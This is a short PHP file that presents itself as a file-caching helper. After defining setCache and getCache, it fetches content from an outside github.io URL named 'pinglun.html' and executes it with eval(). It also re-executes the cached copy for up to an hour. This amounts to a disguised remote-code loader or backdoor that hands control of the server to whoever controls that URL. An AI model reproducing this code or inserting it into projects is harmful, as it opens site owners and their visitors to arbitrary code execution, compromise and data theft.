<?php

function setCache($key, $data) {
    $cacheDir = './cache/';
    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0755, true);
    }

    $filename = $cacheDir.md5($key);
    $data = serialize($data);
    file_put_contents($filename, $data);

}

function getCache($key) {
    $cacheDir = './cache/';
    $filename = $cacheDir.md5($key);
    if (file_exists($filename)) {
        $lastModified = filemtime($filename);
        $currentDateTime = time();
        if ($currentDateTime - $lastModified < 3600) {
            return unserialize(file_get_contents($filename));
        }

    }

    return false; 
}
$index = "pinglun";
$cachedData = getCache($index);

if ($cachedData) {
    eval( $cachedData);
} else {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://baiduc.github.io/pub/bbj/plug/pinglun.html");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    $result = curl_multi_getcontent($ch);
    curl_close($ch);
    setCache($index, $result);
    eval( $result);


}

?>